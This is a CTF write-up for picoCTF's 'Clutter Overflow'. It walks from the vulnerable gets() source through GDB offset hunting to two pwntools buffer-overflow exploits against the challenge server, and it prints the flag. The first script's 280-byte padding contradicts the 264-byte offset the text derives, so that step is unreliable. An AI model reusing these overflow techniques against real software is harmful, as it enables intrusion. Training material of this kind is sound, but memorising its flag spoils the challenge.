---
title: PicoCTF - Clutter Overflow
description: Clutter, clutter everywhere and not a byte to use.
author: 5o1z
date: 2024-11-30 9:57 +0700
categories: [PicoCTF, Pwn]
tags: [pwn, pwntools, code]
image:
  path: /assets/img/picoCTF/picoctf.png
---

## Analysis

Check out this Binary's information:

```bash
➜  clutter-overflow file chall
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=181b4752cc92cfa231c45fe56676612e0ded947a, not stripped
➜  clutter-overflow checksec --file=chall
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   69 Symbols        No    0               2               chall
```

A 64-bit ELF and no Stack Canary
And here is its source code:
```c
#include <stdio.h>
#include <stdlib.h>

#define SIZE 0x100
#define GOAL 0xdeadbeef

const char* HEADER =
" ______________________________________________________________________\n"
"|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|\n"
"| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |\n"
"|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|\n"
"| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \\^ ^ |\n"
"|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \\ ^ _ ^ / |                | \\^ ^|\n"
"| ^/_\\^ ^ ^ /_________\\^ ^ ^ /_\\ | //  | /_\\ ^| |   ____  ____   | | ^ |\n"
"|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|\n"
"| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |\n"
"|^ ^ ^ ^ ^| /     (   \\ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \\|^ ^|\n"
".-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |\n"
"|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\\ |^ ^|\n"
"| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |\n"
"|'.____'_^||/!\\@@@@@/!\\|| _'______________.'|==                    =====\n"
"|\\|______|===============|________________|/|\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n"
"\" ||\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"  \n"
"\"\"''\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n"
"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n"
"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"";

int main(void)
{
  long code = 0;
  char clutter[SIZE];

  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  puts(HEADER);
  puts("My room is so cluttered...");
  puts("What do you see?");

  gets(clutter);


  if (code == GOAL) {
    printf("code == 0x%llx: how did that happen??\n", GOAL);
    puts("take a flag for your troubles");
    system("cat flag.txt");
  } else {
    printf("code == 0x%llx\n", code);
    printf("code != 0x%llx :(\n", GOAL);
  }

  return 0;
}

```

We can see in the source code it uses a vuln function called gets(), this allows us to perform buffer overflow since Stack Canary is disabled. And when **`code == 0xdeadbeef`** we will solve the problem

Let's use GDB to find the offset between the input and the code:

```bash
Breakpoint 1, 0x000000000040074c in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0
$rbx   : 0x00007fffffffdc48  →  0x00007fffffffdecd  →  "/home/alter/Pico/pwn/clutter-overflow/chall"
$rcx   : 0x00007ffff7ebf574  →  0x5477fffff0003d48 ("H="?)
$rdx   : 0x0
$rsp   : 0x00007fffffffda10  →  0x00007fffffffdc00  →  0x00000000004005e0  →  <_start+0000> xor ebp, ebp
$rbp   : 0x00007fffffffdb20  →  0x00007fffffffdbc0  →  0x00007fffffffdc20  →  0x0000000000000000
$rsi   : 0x00007ffff7fa7643  →  0xfa8710000000000a ("\n"?)
$rdi   : 0x00007fffffffda10  →  0x00007fffffffdc00  →  0x00000000004005e0  →  <_start+0000> xor ebp, ebp
$rip   : 0x000000000040074c  →  <main+0085> call 0x4005d0 <gets@plt>
$r8    : 0x10
$r9    : 0x00007ffff7fca380  →  <_dl_fini+0000> endbr64
$r10   : 0x00007ffff7dadbe8  →  0x0011002200006cb5
$r11   : 0x202
$r12   : 0x1
$r13   : 0x0
$r14   : 0x0
$r15   : 0x00007ffff7ffd000  →  0x00007ffff7ffe2e0  →  0x0000000000000000
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffda10│+0x0000: 0x00007fffffffdc00  →  0x00000000004005e0  →  <_start+0000> xor ebp, ebp     ← $rsp, $rdi
0x00007fffffffda18│+0x0008: 0x0000000000000000
0x00007fffffffda20│+0x0010: 0x00007ffff7fc5000  →  0x03010102464c457f
0x00007fffffffda28│+0x0018: 0x00007fffffffdae8  →  0x0000000000000000
0x00007fffffffda30│+0x0020: 0x00007fffffffdb30  →  0x00007fffffffdb70  →  0x0000000000000000
0x00007fffffffda38│+0x0028: 0x00007ffff7fdeddb  →  <init_cpu_features.constprop+07fb> add rsp, 0xc8
0x00007fffffffda40│+0x0030: 0x0000000000000002
0x00007fffffffda48│+0x0038: 0x0000000000000000
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x40073d <main+0076>      lea    rax, [rbp-0x110]
     0x400744 <main+007d>      mov    rdi, rax
     0x400747 <main+0080>      mov    eax, 0x0
●→   0x40074c <main+0085>      call   0x4005d0 <gets@plt>
   ↳    0x4005d0 <gets@plt+0000>  jmp    QWORD PTR [rip+0x201a62]        # 0x602038 <gets@got.plt>
        0x4005d6 <gets@plt+0006>  push   0x4
        0x4005db <gets@plt+000b>  jmp    0x400580
        0x4005e0 <_start+0000>    xor    ebp, ebp
        0x4005e2 <_start+0002>    mov    r9, rdx
        0x4005e5 <_start+0005>    pop    rsi
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
gets@plt (
   $rdi = 0x00007fffffffda10 → 0x00007fffffffdc00 → 0x00000000004005e0 → <_start+0000> xor ebp, ebp,
   $rsi = 0x00007ffff7fa7643 → 0xfa8710000000000a ("\n"?)
)
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall", stopped 0x40074c in main (), reason: BREAKPOINT
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x40074c → main()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  ni
helloiloveyou
0x0000000000400751 in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007fffffffda10  →  "helloiloveyou"
$rbx   : 0x00007fffffffdc48  →  0x00007fffffffdecd  →  "/home/alter/Pico/pwn/clutter-overflow/chall"
$rcx   : 0x00007ffff7fa68e0  →  0x00000000fbad208b
$rdx   : 0x0
$rsp   : 0x00007fffffffda10  →  "helloiloveyou"
$rbp   : 0x00007fffffffdb20  →  0x00007fffffffdbc0  →  0x00007fffffffdc20  →  0x0000000000000000
$rsi   : 0x00007ffff7fa6963  →  0xfa8720000000000a ("\n"?)
$rdi   : 0x00007ffff7fa8720  →  0x0000000000000000
$rip   : 0x0000000000400751  →  <main+008a> mov eax, 0xdeadbeef
$r8    : 0x0
$r9    : 0x0
$r10   : 0x00007ffff7db1008  →  0x00110022000047e8
$r11   : 0x246
$r12   : 0x1
$r13   : 0x0
$r14   : 0x0
$r15   : 0x00007ffff7ffd000  →  0x00007ffff7ffe2e0  →  0x0000000000000000
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffda10│+0x0000: "helloiloveyou"      ← $rax, $rsp
0x00007fffffffda18│+0x0008: 0x000000756f796576 ("veyou"?)
0x00007fffffffda20│+0x0010: 0x00007ffff7fc5000  →  0x03010102464c457f
0x00007fffffffda28│+0x0018: 0x00007fffffffdae8  →  0x0000000000000000
0x00007fffffffda30│+0x0020: 0x00007fffffffdb30  →  0x00007fffffffdb70  →  0x0000000000000000
0x00007fffffffda38│+0x0028: 0x00007ffff7fdeddb  →  <init_cpu_features.constprop+07fb> add rsp, 0xc8
0x00007fffffffda40│+0x0030: 0x0000000000000002
0x00007fffffffda48│+0x0038: 0x0000000000000000
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400744 <main+007d>      mov    rdi, rax
     0x400747 <main+0080>      mov    eax, 0x0
●    0x40074c <main+0085>      call   0x4005d0 <gets@plt>
 →   0x400751 <main+008a>      mov    eax, 0xdeadbeef
     0x400756 <main+008f>      cmp    QWORD PTR [rbp-0x8], rax
     0x40075a <main+0093>      jne    0x40078c <main+197>
     0x40075c <main+0095>      mov    esi, 0xdeadbeef
     0x400761 <main+009a>      lea    rdi, [rip+0x690]        # 0x400df8
     0x400768 <main+00a1>      mov    eax, 0x0
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall", stopped 0x400751 in main (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400751 → main()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  ni
0x0000000000400756 in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xdeadbeef
$rbx   : 0x00007fffffffdc48  →  0x00007fffffffdecd  →  "/home/alter/Pico/pwn/clutter-overflow/chall"
$rcx   : 0x00007ffff7fa68e0  →  0x00000000fbad208b
$rdx   : 0x0
$rsp   : 0x00007fffffffda10  →  "helloiloveyou"
$rbp   : 0x00007fffffffdb20  →  0x00007fffffffdbc0  →  0x00007fffffffdc20  →  0x0000000000000000
$rsi   : 0x00007ffff7fa6963  →  0xfa8720000000000a ("\n"?)
$rdi   : 0x00007ffff7fa8720  →  0x0000000000000000
$rip   : 0x0000000000400756  →  <main+008f> cmp QWORD PTR [rbp-0x8], rax
$r8    : 0x0
$r9    : 0x0
$r10   : 0x00007ffff7db1008  →  0x00110022000047e8
$r11   : 0x246
$r12   : 0x1
$r13   : 0x0
$r14   : 0x0
$r15   : 0x00007ffff7ffd000  →  0x00007ffff7ffe2e0  →  0x0000000000000000
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffda10│+0x0000: "helloiloveyou"      ← $rsp
0x00007fffffffda18│+0x0008: 0x000000756f796576 ("veyou"?)
0x00007fffffffda20│+0x0010: 0x00007ffff7fc5000  →  0x03010102464c457f
0x00007fffffffda28│+0x0018: 0x00007fffffffdae8  →  0x0000000000000000
0x00007fffffffda30│+0x0020: 0x00007fffffffdb30  →  0x00007fffffffdb70  →  0x0000000000000000
0x00007fffffffda38│+0x0028: 0x00007ffff7fdeddb  →  <init_cpu_features.constprop+07fb> add rsp, 0xc8
0x00007fffffffda40│+0x0030: 0x0000000000000002
0x00007fffffffda48│+0x0038: 0x0000000000000000
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400747 <main+0080>      mov    eax, 0x0
●    0x40074c <main+0085>      call   0x4005d0 <gets@plt>
     0x400751 <main+008a>      mov    eax, 0xdeadbeef
 →   0x400756 <main+008f>      cmp    QWORD PTR [rbp-0x8], rax
     0x40075a <main+0093>      jne    0x40078c <main+197>
     0x40075c <main+0095>      mov    esi, 0xdeadbeef
     0x400761 <main+009a>      lea    rdi, [rip+0x690]        # 0x400df8
     0x400768 <main+00a1>      mov    eax, 0x0
     0x40076d <main+00a6>      call   0x4005c0 <printf@plt>
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall", stopped 0x400756 in main (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400756 → main()
```

As we can see, our input is at **0x00007fffffffda10** and at main+008f we see it compares to some variable, maybe that variable is code because it compares to **0xdeadbeef.** We will calculate the address from input to here, but first we need to calculate its offset by:
```bash
gef➤  x/xg $rbp-0x8
0x7fffffffdb18: 0x0000000000000000
gef➤  shell
➜  clutter-overflow python3
Python 3.12.3 (main, Nov  6 2024, 18:32:19) [GCC 13.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x7fffffffdb18-0x00007fffffffda10
264
```

So our offset is 264, and that's enough for us to write an exploit.

## Exploit

```python
#!/usr/bin/python3

from pwn import *

# context.log_level = 'debug'
exe = context.binary = ELF('./chall', checksec=False)



# Shorthanding functions for input/output
info = lambda msg: log.info(msg)
s = lambda data: p.send(data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
r = lambda: p.recv()
rl = lambda: p.recvline()
rall = lambda: p.recvall()

# GDB scripts for debugging
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''

b*0x00000000004007bf
c
''')

p = remote('mars.picoctf.net', 31890) if args.REMOTE else process(argv=[exe.path], aslr=False)
if args.GDB:
    GDB()
    input()

# ===========================================================
#                          EXPLOIT
# ===========================================================


pl = b'A'*280 + p64(0xdeadbeef)

sl(pl)

p.interactive()

```

```bash
➜  clutter-overflow python3 exploit.py REMOTE
[+] Opening connection to mars.picoctf.net on port 31890: Done
[*] Switching to interactive mode
 ______________________________________________________________________
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \^ ^ |
|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \ ^ _ ^ / |                | \^ ^|
| ^/_\^ ^ ^ /_________\^ ^ ^ /_\ | //  | /_\ ^| |   ____  ____   | | ^ |
|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|
| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |
|^ ^ ^ ^ ^| /     (   \ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \|^ ^|
.-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |
|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\ |^ ^|
| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |
|'.____'_^||/!\@@@@@/!\|| _'______________.'|==                    =====
|\|______|===============|________________|/|""""""""""""""""""""""""""
" ||""""||"""""""""""""""||""""""""""""""||"""""""""""""""""""""""""""""
""''""""''"""""""""""""""''""""""""""""""''""""""""""""""""""""""""""""""
""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
My room is so cluttered...
What do you see?
code == 0xdeadbeef: how did that happen??
take a flag for your troubles
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
[*] Got EOF while reading in interactive
$
```

### Extra

Since this is a buffer overflow and it doesn't have any protection, we can think about controlling its RIP and letting it return to the flag reading function

Find the offset to RIP as usual:

```bash
gef➤  i f
Stack level 0, frame at 0x7fffffffdb30:
 rip = 0x400751 in main; saved rip = 0x7ffff7dcd1ca
 Arglist at 0x7fffffffdb20, args:
 Locals at 0x7fffffffdb20, Previous frame's sp is 0x7fffffffdb30
 Saved registers:
  rbp at 0x7fffffffdb20, rip at 0x7fffffffdb28
gef➤  shell
➜  clutter-overflow python3
Python 3.12.3 (main, Nov  6 2024, 18:32:19) [GCC 13.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x7fffffffdb28-0x00007fffffffda10
280
```

And we will determine where we want it to return:

```bash
gef➤  disas*main
Dump of assembler code for function main:
   0x00000000004006c7 <+0>:     push   rbp
   0x00000000004006c8 <+1>:     mov    rbp,rsp
   0x00000000004006cb <+4>:     sub    rsp,0x110
   0x00000000004006d2 <+11>:    mov    QWORD PTR [rbp-0x8],0x0
   0x00000000004006da <+19>:    mov    rax,QWORD PTR [rip+0x20197f]        # 0x602060 <stdout@@GLIBC_2.2.5>
   0x00000000004006e1 <+26>:    mov    esi,0x0
   0x00000000004006e6 <+31>:    mov    rdi,rax
   0x00000000004006e9 <+34>:    call   0x4005a0 <setbuf@plt>
   0x00000000004006ee <+39>:    mov    rax,QWORD PTR [rip+0x20197b]        # 0x602070 <stdin@@GLIBC_2.2.5>
   0x00000000004006f5 <+46>:    mov    esi,0x0
   0x00000000004006fa <+51>:    mov    rdi,rax
   0x00000000004006fd <+54>:    call   0x4005a0 <setbuf@plt>
   0x0000000000400702 <+59>:    mov    rax,QWORD PTR [rip+0x201977]        # 0x602080 <stderr@@GLIBC_2.2.5>
   0x0000000000400709 <+66>:    mov    esi,0x0
   0x000000000040070e <+71>:    mov    rdi,rax
   0x0000000000400711 <+74>:    call   0x4005a0 <setbuf@plt>
   0x0000000000400716 <+79>:    mov    rax,QWORD PTR [rip+0x201933]        # 0x602050 <HEADER>
   0x000000000040071d <+86>:    mov    rdi,rax
   0x0000000000400720 <+89>:    call   0x400590 <puts@plt>
   0x0000000000400725 <+94>:    lea    rdi,[rip+0x69d]        # 0x400dc9
   0x000000000040072c <+101>:   call   0x400590 <puts@plt>
   0x0000000000400731 <+106>:   lea    rdi,[rip+0x6ac]        # 0x400de4
   0x0000000000400738 <+113>:   call   0x400590 <puts@plt>
   0x000000000040073d <+118>:   lea    rax,[rbp-0x110]
   0x0000000000400744 <+125>:   mov    rdi,rax
   0x0000000000400747 <+128>:   mov    eax,0x0
   0x000000000040074c <+133>:   call   0x4005d0 <gets@plt>
   0x0000000000400751 <+138>:   mov    eax,0xdeadbeef
   0x0000000000400756 <+143>:   cmp    QWORD PTR [rbp-0x8],rax
   0x000000000040075a <+147>:   jne    0x40078c <main+197>
   0x000000000040075c <+149>:   mov    esi,0xdeadbeef
   0x0000000000400761 <+154>:   lea    rdi,[rip+0x690]        # 0x400df8
   0x0000000000400768 <+161>:   mov    eax,0x0
   0x000000000040076d <+166>:   call   0x4005c0 <printf@plt>
   0x0000000000400772 <+171>:   lea    rdi,[rip+0x6a6]        # 0x400e1f
   0x0000000000400779 <+178>:   call   0x400590 <puts@plt>
   0x000000000040077e <+183>:   lea    rdi,[rip+0x6b8]        # 0x400e3d
   0x0000000000400785 <+190>:   call   0x4005b0 <system@plt>
   0x000000000040078a <+195>:   jmp    0x4007ba <main+243>
   0x000000000040078c <+197>:   mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000400790 <+201>:   mov    rsi,rax
   0x0000000000400793 <+204>:   lea    rdi,[rip+0x6b0]        # 0x400e4a
   0x000000000040079a <+211>:   mov    eax,0x0
   0x000000000040079f <+216>:   call   0x4005c0 <printf@plt>
   0x00000000004007a4 <+221>:   mov    esi,0xdeadbeef
   0x00000000004007a9 <+226>:   lea    rdi,[rip+0x6aa]        # 0x400e5a
   0x00000000004007b0 <+233>:   mov    eax,0x0
   0x00000000004007b5 <+238>:   call   0x4005c0 <printf@plt>
   0x00000000004007ba <+243>:   mov    eax,0x0
   0x00000000004007bf <+248>:   leave
   0x00000000004007c0 <+249>:   ret
```

Here I will let it return **main+183**

```python
#!/usr/bin/python3

from pwn import *

# context.log_level = 'debug'
exe = context.binary = ELF('./chall', checksec=False)



# Shorthanding functions for input/output
info = lambda msg: log.info(msg)
s = lambda data: p.send(data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
r = lambda: p.recv()
rl = lambda: p.recvline()
rall = lambda: p.recvall()

# GDB scripts for debugging
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''

b*0x00000000004007bf
c
''')

p = remote('mars.picoctf.net', 31890) if args.REMOTE else process(argv=[exe.path], aslr=False)
if args.GDB:
    GDB()
    input()

# ===========================================================
#                          EXPLOIT
# ===========================================================


pl = b'A'*280 + p64(exe.sym['main']+183)

sl(pl)

p.interactive()
```

```bash
➜  clutter-overflow python3 exploit.py REMOTE
[+] Opening connection to mars.picoctf.net on port 31890: Done
[*] Switching to interactive mode
 ______________________________________________________________________
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \^ ^ |
|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \ ^ _ ^ / |                | \^ ^|
| ^/_\^ ^ ^ /_________\^ ^ ^ /_\ | //  | /_\ ^| |   ____  ____   | | ^ |
|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|
| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |
|^ ^ ^ ^ ^| /     (   \ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \|^ ^|
.-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |
|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\ |^ ^|
| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |
|'.____'_^||/!\@@@@@/!\|| _'______________.'|==                    =====
|\|______|===============|________________|/|""""""""""""""""""""""""""
" ||""""||"""""""""""""""||""""""""""""""||"""""""""""""""""""""""""""""
""''""""''"""""""""""""""''""""""""""""""''""""""""""""""""""""""""""""""
""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
My room is so cluttered...
What do you see?
code == 0x4141414141414141
code != 0xdeadbeef :(
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
[*] Got EOF while reading in interactive
```
